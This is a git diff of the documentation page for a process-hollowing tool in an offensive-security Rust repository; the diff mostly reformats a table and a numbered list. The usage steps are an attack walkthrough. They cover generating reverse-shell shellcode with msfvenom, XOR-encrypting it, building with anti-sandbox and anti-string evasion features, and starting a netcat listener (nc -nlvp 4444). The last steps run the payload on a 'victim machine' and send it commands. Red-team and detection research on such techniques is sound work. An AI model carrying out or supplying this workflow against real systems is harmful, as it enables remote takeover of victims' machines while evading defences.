@@ -7,11 +7,14 @@ datatable: true
 
 [![Custom badge](https://img.shields.io/endpoint?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkmanc%2Fremote_code_oxidation%2Fmaster%2F.custom_shields%2Fprocess_hollowing.json)](https://github.com/kmanc/remote_code_oxidation/tree/master/process_hollowing)
 
+<div class="datatable-begin"></div>
+
 Target OS | Demo
 --------- | ----
 Linux     | ![gif](/gifs/process_hollowing.gif)
 Windows   | [![gif](https://user-images.githubusercontent.com/14863147/151642061-6df0f601-3f07-4e0c-aaf5-fbbc229de2e0.gif)](https://user-images.githubusercontent.com/14863147/151642061-6df0f601-3f07-4e0c-aaf5-fbbc229de2e0.gif)
 
+<div class="datatable-end"></div>
 
 ## How it works
 
@@ -22,27 +25,25 @@ Linux process hollowing functions a little differently. First, the executable cr
 
 ## Using it
 
-1. [Not shown in demo] Generate shellcode for the desired end result (for example, use [msfvenom](https://book.hacktricks.xyz/shells/shells/msfvenom) to generate a reverse TCP shell shellcode for the target operating system)
-2. [Not shown in demo] Open [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs) 
+1.  [Not shown in demo] Generate shellcode for the desired end result (for example, use [msfvenom](https://book.hacktricks.xyz/shells/shells/msfvenom) to generate a reverse TCP shell shellcode for the target operating system)
+2.  [Not shown in demo] Open [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs) 
 and change the shellcode to the shellcode generated in step 1
-3. [Optional - shown in xor_params demo] Encrypt the shellcode and target process using [xor_params](https://github.com/kmanc/remote_code_oxidation/blob/master/xor_shellcode) and update the encrypted shellcode value in [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs)  
-4. [Not shown in demo] Compile the executable, only including `--features xor` if you did step 3
-
-    1. Build for Linux target
-    ```commandline
-    cargo build -p process_hollowing [antisand][,][antistring][,][xor]] --release
-    ```
-
-    2. Build for Windows target
-    ```commandline
-    cargo build --target x86_64-pc-windows-gnu -p process_hollowing [antisand][,][antistring][,][xor]] --release
-    ```
-5. Start a netcat listener on the attacking machine on the same port you configured the shellcode to connect to in step 1
-    ```commandline
-    nc -nlvp 4444
-    ```   
-6. Execute the payload on the victim machine
-7. Return to the listener and enter desired commands for the victim machine to run
+3.  [Optional - shown in xor_params demo] Encrypt the shellcode and target process using [xor_params](https://github.com/kmanc/remote_code_oxidation/blob/master/xor_shellcode) and update the encrypted shellcode value in [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs)  
+4.  [Not shown in demo] Compile the executable, only including `--features xor` if you did step 3
+  1.  Build for Linux target
+  ```commandline
+  cargo build -p process_hollowing [antisand][,][antistring][,][xor]] --release
+  ```
+  2.  Build for Windows target
+  ```commandline
+  cargo build --target x86_64-pc-windows-gnu -p process_hollowing [antisand][,][antistring][,][xor]] --release
+  ```
+5.  Start a netcat listener on the attacking machine on the same port you configured the shellcode to connect to in step 1
+```commandline
+nc -nlvp 4444
+```   
+6.  Execute the payload on the victim machine
+7.  Return to the listener and enter desired commands for the victim machine to run
 
 
 ## Detection rates
